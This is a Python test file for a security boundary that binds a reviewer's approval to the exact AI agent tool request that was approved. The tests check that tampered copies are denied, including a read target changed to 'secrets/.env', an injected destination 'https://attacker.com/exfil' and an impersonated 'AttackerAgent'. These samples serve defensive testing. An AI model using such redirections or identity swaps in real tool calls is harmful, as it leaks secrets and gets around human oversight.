import pytest
from app.security.models import (
    ToolRequest,
    AgentIdentity,
    ToolCategory,
    ActionType,
    SecurityDecision,
    SecurityDecisionType,
    RiskAssessment,
    ThreatReport,
    Severity,
)
from app.security.gateway import SecurityEvaluationResult
from app.security.approval.service import ApprovalService
from app.security.approval.contracts import ReviewerIdentity
from app.security.enforcement import SecurityEnforcementBoundary

def _make_eval(req: ToolRequest) -> SecurityEvaluationResult:
    return SecurityEvaluationResult(
        request=req,
        threat_report=ThreatReport(request_id=req.request_id, signals=[], overall_severity=Severity.MEDIUM, summary="Medium"),
        risk_assessment=RiskAssessment(request_id=req.request_id, risk_score=55.0, severity=Severity.MEDIUM, rationale="Risk"),
        decision=SecurityDecision(
            request_id=req.request_id,
            decision=SecurityDecisionType.REQUIRE_APPROVAL,
            policy_id="test.approval.policy",
            reason="Prompt requires review",
        ),
    )

def test_tampered_request_parameters_rejected_after_approval():
    service = ApprovalService()
    boundary = SecurityEnforcementBoundary()

    original_req = ToolRequest(
        request_id="req-sec-01",
        agent=AgentIdentity(name="Agent1"),
        tool_name="calculator.compute",
        tool_category=ToolCategory.SYSTEM,
        action=ActionType.EXECUTE,
        target="calculator",
        parameters={"op": "add", "a": 5, "b": 10},
    )
    eval_res = _make_eval(original_req)
    approval = service.create_approval(eval_res)

    # Approve
    reviewer = ReviewerIdentity(reviewer_id="rev-sec-01")
    approved = service.approve(approval.approval_id, reviewer=reviewer, reason="Legitimate add calculation")

    # 1. Validation with original unmodified request -> Authorized
    enf_valid = boundary.authorize_approval(request=original_req, approval=approved)
    assert enf_valid.authorized is True
    assert enf_valid.authorization is not None

    # 2. Validation with tampered parameters -> Denied
    tampered_params_req = ToolRequest(
        request_id="req-sec-01",
        agent=original_req.agent,
        tool_name="calculator.compute",
        tool_category=ToolCategory.SYSTEM,
        action=ActionType.EXECUTE,
        target="calculator",
        parameters={"op": "multiply", "a": 5, "b": 99999},  # Tampered!
    )
    enf_tampered = boundary.authorize_approval(request=tampered_params_req, approval=approved)
    assert enf_tampered.authorized is False
    assert enf_tampered.authorization is None
    assert "fingerprint mismatch" in enf_tampered.reason

def test_tampered_target_and_destination_rejected_after_approval():
    service = ApprovalService()
    boundary = SecurityEnforcementBoundary()

    req = ToolRequest(
        request_id="req-sec-02",
        agent=AgentIdentity(name="Agent2"),
        tool_name="file.read",
        tool_category=ToolCategory.FILESYSTEM,
        action=ActionType.READ,
        target="public.txt",
        destination=None,
    )
    eval_res = _make_eval(req)
    approval = service.create_approval(eval_res)
    reviewer = ReviewerIdentity(reviewer_id="rev-02")
    approved = service.approve(approval.approval_id, reviewer=reviewer, reason="Read allowed")

    # Tampered target
    tampered_target = ToolRequest(
        request_id="req-sec-02",
        agent=req.agent,
        tool_name="file.read",
        tool_category=ToolCategory.FILESYSTEM,
        action=ActionType.READ,
        target="secrets/.env",  # Tampered!
    )
    enf_res = boundary.authorize_approval(request=tampered_target, approval=approved)
    assert enf_res.authorized is False
    assert enf_res.authorization is None

    # Tampered destination
    tampered_dest = ToolRequest(
        request_id="req-sec-02",
        agent=req.agent,
        tool_name="file.read",
        tool_category=ToolCategory.FILESYSTEM,
        action=ActionType.READ,
        target="public.txt",
        destination="https://attacker.com/exfil",  # Injected!
    )
    enf_dest = boundary.authorize_approval(request=tampered_dest, approval=approved)
    assert enf_dest.authorized is False

def test_wrong_agent_identity_rejected_after_approval():
    service = ApprovalService()
    boundary = SecurityEnforcementBoundary()

    req = ToolRequest(
        request_id="req-sec-03",
        agent=AgentIdentity(name="OriginalAgent"),
        tool_name="string.transform",
        tool_category=ToolCategory.SYSTEM,
        action=ActionType.EXECUTE,
        target="text",
    )
    eval_res = _make_eval(req)
    approval = service.create_approval(eval_res)
    approved = service.approve(approval.approval_id, reviewer=ReviewerIdentity(reviewer_id="rev-03"), reason="Ok")

    wrong_agent_req = ToolRequest(
        request_id="req-sec-03",
        agent=AgentIdentity(name="AttackerAgent"),  # Wrong agent!
        tool_name="string.transform",
        tool_category=ToolCategory.SYSTEM,
        action=ActionType.EXECUTE,
        target="text",
    )
    enf_agent = boundary.authorize_approval(request=wrong_agent_req, approval=approved)
    assert enf_agent.authorized is False
    assert "Agent identity mismatch" in enf_agent.reason or "mismatch" in enf_agent.reason
